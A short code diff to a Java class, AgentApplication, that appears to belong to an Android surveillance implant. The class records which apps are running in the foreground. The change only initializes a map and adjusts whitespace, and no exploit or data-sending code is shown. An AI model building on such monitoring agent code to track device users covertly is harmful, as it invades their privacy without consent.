@@ -23,7 +23,7 @@ import com.ht.RCSAndroidGUI.util.WChar;
 public class AgentApplication extends AgentBase implements Observer<RunningProcesses> {
 	private static final String TAG = "AgentApplication";
 
-	TreeMap<String, RunningAppProcessInfo> lastRunning;
+	TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
 	TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();
 
 	@Override
@@ -52,7 +52,7 @@ public class AgentApplication extends AgentBase implements Observer<RunningProce
 			return 0;
 		}
 		currentRunning.clear();
-		
+
 		for (Iterator iterator = list.iterator(); iterator.hasNext();) {
 			RunningAppProcessInfo running = (RunningAppProcessInfo) iterator.next();
 			if (running.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
